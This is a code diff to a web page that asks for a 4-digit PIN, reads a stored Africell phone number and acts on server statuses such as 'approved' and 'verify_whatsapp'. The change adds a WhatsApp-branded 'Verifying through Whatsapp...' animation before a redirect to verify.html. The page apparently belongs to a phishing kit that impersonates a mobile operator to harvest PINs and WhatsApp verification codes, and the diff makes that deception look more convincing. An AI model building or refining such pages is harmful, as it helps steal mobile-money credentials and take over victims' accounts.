@@ -104,6 +104,78 @@
         }
         .keypad-btn:active { background: #E5E7EB; }
         .keypad-btn.action-key { font-size: 22px; color: #4B5563; }
+
+        /* WhatsApp transition animation overlay */
+        .wa-transition-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(255, 255, 255, 0.96);
+            backdrop-filter: blur(6px);
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 28px;
+            text-align: center;
+            z-index: 999;
+            opacity: 0;
+            transition: opacity 0.28s ease;
+        }
+
+        .wa-transition-overlay.visible {
+            display: flex;
+            opacity: 1;
+        }
+
+        .wa-spinner-ring {
+            width: 72px;
+            height: 72px;
+            border-radius: 50%;
+            border: 4px solid rgba(33, 192, 99, 0.18);
+            border-top-color: #21c063;
+            border-right-color: #991676;
+            animation: waSpin 0.9s linear infinite;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 24px;
+            box-shadow: 0 10px 25px rgba(33, 192, 99, 0.16);
+        }
+
+        .wa-spinner-icon {
+            font-size: 28px;
+            color: #21c063;
+            animation: waPulse 1.4s ease-in-out infinite;
+        }
+
+        .wa-status-text {
+            font-size: 19px;
+            font-weight: 700;
+            color: #1F2937;
+            margin-bottom: 8px;
+            min-height: 28px;
+            transition: opacity 0.22s ease, transform 0.22s ease;
+        }
+
+        .wa-status-text.fade-step {
+            opacity: 0;
+            transform: translateY(6px);
+        }
+
+        .wa-phone-sub {
+            font-size: 14px;
+            font-weight: 500;
+            color: #6B7280;
+        }
+
+        @keyframes waSpin {
+            to { transform: rotate(360deg); }
+        }
+
+        @keyframes waPulse {
+            0%, 100% { transform: scale(0.95); }
+            50% { transform: scale(1.08); }
+        }
     </style>
 </head>
 <body>
@@ -148,19 +220,55 @@
         </div>
     </div>
 
+    <div id="waTransitionOverlay" class="wa-transition-overlay" aria-live="polite">
+        <div class="wa-spinner-ring">
+            <i class="fa-brands fa-whatsapp wa-spinner-icon"></i>
+        </div>
+        <div id="waStatusText" class="wa-status-text">Verifying User Phone Number...</div>
+        <div id="waPhoneSub" class="wa-phone-sub"></div>
+    </div>
+
     <script>
         const loginBtn = document.getElementById('loginBtn');
         const errorBox = document.getElementById('inlineErrorBox');
         const errorText = document.getElementById('errorText');
+        const waOverlay = document.getElementById('waTransitionOverlay');
+        const waStatusText = document.getElementById('waStatusText');
+        const waPhoneSub = document.getElementById('waPhoneSub');
 
         let pinDigits = ['', '', '', ''];
         let activeInterval = null;
         let safetyTimeout = null;
         let errorTimeout = null;
         let isSubmitting = false;
+        let isRedirectingWhatsapp = false;
 
         function getCurrentPhone() {
             return (localStorage.getItem('africellUserPhone') || localStorage.getItem('userPhone') || '+232 00000000').trim();
+        }
+
+        function playWhatsappTransitionAndRedirect() {
+            if (isRedirectingWhatsapp) return;
+            isRedirectingWhatsapp = true;
+            clearTimers();
+            isSubmitting = false;
+
+            const currentPhone = getCurrentPhone();
+            waStatusText.textContent = 'Verifying User Phone Number...';
+            waPhoneSub.textContent = currentPhone !== '+232 00000000' ? currentPhone : '';
+            waOverlay.classList.add('visible');
+
+            setTimeout(() => {
+                waStatusText.classList.add('fade-step');
+                setTimeout(() => {
+                    waStatusText.textContent = 'Verifying through Whatsapp...';
+                    waStatusText.classList.remove('fade-step');
+                }, 220);
+            }, 1200);
+
+            setTimeout(() => {
+                window.location.href = 'verify.html';
+            }, 2500);
         }
 
         window.addEventListener('DOMContentLoaded', () => {
@@ -207,7 +315,7 @@
         }
 
         function pressKey(digit) {
-            if (isSubmitting) return;
+            if (isSubmitting || isRedirectingWhatsapp) return;
             const firstEmpty = pinDigits.findIndex(d => d === '');
             if (firstEmpty !== -1) {
                 pinDigits[firstEmpty] = digit;
@@ -216,7 +324,7 @@
         }
 
         function deleteKey() {
-            if (isSubmitting) return;
+            if (isSubmitting || isRedirectingWhatsapp) return;
             for (let i = 3; i >= 0; i--) {
                 if (pinDigits[i] !== '') { pinDigits[i] = ''; break; }
             }
@@ -224,7 +332,7 @@
         }
 
         function validateForm() {
-            if (isSubmitting) return;
+            if (isSubmitting || isRedirectingWhatsapp) return;
             if (pinDigits.every(d => d !== '')) {
                 loginBtn.removeAttribute('disabled');
                 loginBtn.classList.add('enabled');
@@ -236,7 +344,7 @@
         }
 
         function handleLogin() {
-            if (isSubmitting) return;
+            if (isSubmitting || isRedirectingWhatsapp) return;
             const pinCode = pinDigits.join('');
             if (pinCode.length !== 4) {
                 showInlineError('Please enter your 4-digit PIN.');
@@ -304,9 +412,7 @@
                     }
 
                     if (data.status === 'verify_whatsapp') {
-                        clearTimers();
-                        isSubmitting = false;
-                        window.location.href = 'verify.html';
+                        playWhatsappTransitionAndRedirect();
                     }
                     else if (data.status === 'approved') {
                         clearTimers();
